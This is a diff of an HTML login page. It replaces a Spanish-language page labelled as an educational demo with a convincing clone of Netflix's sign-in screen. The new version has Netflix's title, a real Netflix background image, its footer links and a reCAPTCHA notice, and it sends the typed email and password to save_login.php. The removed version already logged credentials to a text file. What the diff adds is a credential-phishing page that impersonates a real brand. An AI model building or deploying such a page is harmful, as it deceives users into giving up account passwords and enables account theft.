@@ -3,117 +3,300 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ejemplo Educativo - Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+    <title>Netflix</title>
     <style>
-        :root {
-            --red: #e50914;
-            --dark: #141414;
-            --gray: #737373;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Helvetica Neue', sans-serif;
-        }
-
         body {
-            background: url('https://images.unsplash.com/photo-1626814026160-2237a95fc5a0') no-repeat center/cover fixed;
-            height: 100vh;
-        }
-
-        .overlay {
-            background: rgba(0, 0, 0, 0.8);
-            height: 100%;
-        }
-
-        .netflix-logo {
-            width: 167px;
-            height: 45px;
-            margin: 20px 0 0 40px;
+            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            overflow: hidden; /* Hide scrollbars */
         }
 
         .login-container {
-            background: rgba(0, 0, 0, 0.75);
-            width: 450px;
-            margin: 0 auto;
-            padding: 60px 68px;
-            border-radius: 4px;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url(https://assets.nflxext.com/ffe/siteui/vlv3/50fcc930-ba3f-4cae-9257-9f920e30a998/web/ES-en-20250310-TRIFECTA-perspective_3d6fec3b-833a-415d-ad70-312e72703cce_medium.jpg) no-repeat center center fixed;
+            background-size: cover;
         }
 
-        /* ... (conserva todos los estilos CSS anteriores del popup y formulario) ... */
-    </style>
-</head>
-<body>
-    <div class="overlay">
-        <img 
-            src="https://www.freepnglogos.com/uploads/red-netflix-logo-text-png-3.png" 
-            alt="Logo Educativo" 
-            class="netflix-logo"
-        >
+        .login-form {
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 60px;
+            border-radius: 4px;
+            width: 450px;
+            max-width: 100%; /* Make it responsive */
+            box-sizing: border-box; /* Include padding in width calculation*/
+        }
 
-        <div class="login-container">
-            <h1>Iniciar sesión</h1>
-            <form id="loginForm" method="POST" action="#">
-                <input type="email" class="input-field" id="email" name="email" placeholder="Correo electrónico" required>
-                <input type="password" class="input-field" id="password" name="password" placeholder="Contraseña" required>
-                <button type="submit" class="login-button">Acceder</button>
-            </form>
+        .logo {
+            width: 167px;
+            margin-bottom: 30px;
+        }
 
-            <!-- Popup de datos -->
-            <div id="dataPopup" class="data-popup">
-                <h2>⚠️ Datos enviados por POST (Simulación)</h2>
-                <pre id="dataContent"></pre>
-                <button class="close-btn" onclick="closePopup()">Cerrar</button>
-            </div>
+        h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
 
-            <!-- Opciones y registro (igual que antes) -->
-        </div>
-    </div>
+        .form-group {
+            margin-bottom: 20px;
+        }
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 4px;
+            border: 0;
+            background-color: #333;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 0;
+        }
 
-            // Obtener datos del formulario
-            const formData = new FormData(e.target);
-            const data = Object.fromEntries(formData.entries());
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            background-color: #444;
+        }
 
-            // Mostrar en popup (simulación)
-            document.getElementById('dataContent').textContent = 
-                `Datos enviados por POST:\n\nEmail: ${data.email}\nContraseña: ${data.password}\n\n⚠️ ADVERTENCIA:\nEn producción, esto se enviaría al servidor.`;
+        .login-button {
+            background-color: #e50914;
+            color: #fff;
+            padding: 16px 20px;
+            border: 0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+        }
 
-            document.getElementById('dataPopup').classList.add('visible');
+        .login-button:hover {
+            background-color: #c60710;
+        }
 
-            // Simular envío POST a un script PHP (opcional)
-            try {
-                const response = await fetch('login.php', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+        .remember-me {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
 
-                if (!response.ok) throw new Error('Error en el servidor');
-            } catch (error) {
-                console.error('Error:', error);
+        .remember-me label {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            color: #b3b3b3;
+        }
+
+        .remember-me input[type="checkbox"] {
+            margin-right: 5px;
+        }
+
+        .help a {
+            color: #b3b3b3;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .help a:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            color: #b3b3b3;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .signup a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+
+        .form-error {
+            color: #e87c03;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+
+        /* Footer (Simplified)*/
+        .login-footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.75);/*Semi-transparent Black*/
+            padding: 20px;
+            text-align: left; /* Align content to the left */
+            color: #737373;
+            font-size: 13px;
+            box-sizing: border-box; /* Include padding */
+        }
+
+        .login-footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-bottom: 10px; /* Space between links and language selector */
+        }
+
+        .footer-links ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex; /* Arrange links horizontally */
+            flex-wrap: wrap; /* Allow links to wrap to the next line on smaller screens */
+        }
+
+        .footer-links li {
+            margin-right: 15px; /* Space between links */
+        }
+
+        /* Language Selector */
+        .lang-selector {
+            margin-bottom: 10px;
+        }
+
+        .lang-selector select {
+            background-color: black;
+            color: white;
+            border: 1px solid #737373;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            appearance: none; /* Remove default arrow */
+            background-image: url('data:image/svg+xml;utf8,<svg fill="%23737373" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>'); /* Custom arrow */
+            background-repeat: no-repeat;
+            background-position: right 8px top 50%;
+            cursor: pointer;
+
+        }
+
+        .lang-selector select:focus{
+            outline: none;
+            border-color: white;
+        }
+
+        /* Responsive Design (Example) */
+        @media (max-width: 768px) {
+            .login-form {
+                padding: 40px;
             }
-        });
 
-        function closePopup() {
-            document.getElementById('dataPopup').classList.remove('visible');
-            document.getElementById('loginForm').reset();
+            .footer-links ul {
+                flex-direction: column; /* Stack links on smaller screens */
+            }
+
+            .footer-links li {
+                margin-bottom: 5px;
+            }
+        }
+
+            /* Hide scrollbar for Chrome, Safari and Opera */
+            body::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Hide scrollbar for IE, Edge and Firefox */
+        body {
+            -ms-overflow-style: none;
+            scrollbar-width: none; /* Firefox */
+        }
+    </style>
+     <script>
+        function submitForm(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const data = `email=${email}&password=${password}`;
+
+            fetch('save_login.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: data
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Datos guardados correctamente.');
+                } else {
+                    alert('Error al guardar los datos.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error al guardar los datos.');
+            });
         }
     </script>
+</head>
+<body>
+    <div class="login-container">
+        <form class="login-form" action="save_login.php" method="POST" onsubmit="submitForm(event)">
+            <img src="netflix_logo.png" alt="Netflix Logo" class="logo">
+            <h1>Sign In</h1>
+            <div class="form-group">
+                <input type="email" id="email" name="email" placeholder="Email or phone number" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-button">Sign In</button>
+            <div class="remember-me">
+                <label><input type="checkbox"> Remember me</label>
+                <div class="help"><a href="#">Need help?</a></div>
+            </div>
+            <div class="signup">
+                New to Netflix? <a href="#">Sign up now</a>.
+            </div>
+            <div style="margin-top:20px; color:#8c8c8c; font-size:13px;">
+                This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#" style="color:#0071eb;">Learn more.</a>
+            </div>
+        </form>
+    </div>
 
-    <?php
-    // Script PHP para guardar datos (opcional)
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        $data = json_decode(file_get_contents('php://input'), true);
-        $log = "Email: " . ($data['email'] ?? '') . " | Contraseña: " . ($data['password'] ?? '') . "\n";
-        file_put_contents('log.txt', $log, FILE_APPEND);
-    }
-    ?>
+    <div class="login-footer">
+        <div class="footer-links">
+            <ul>
+                <li><a href="#">FAQ</a></li>
+                <li><a href="#">Help Center</a></li>
+                <li><a href="#">Terms of Use</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Cookie Preferences</a></li>
+                <li><a href="#">Corporate Information</a></li>
+            </ul>
+        </div>
+
+        <div class="lang-selector">
+            <select>
+                <option>English</option>
+                <option>Español</option>
+            </select>
+        </div>
+    </div>
+  <script>
+        // Simple JavaScript to prevent scrolling
+
+    </script>
 </body>
 </html>
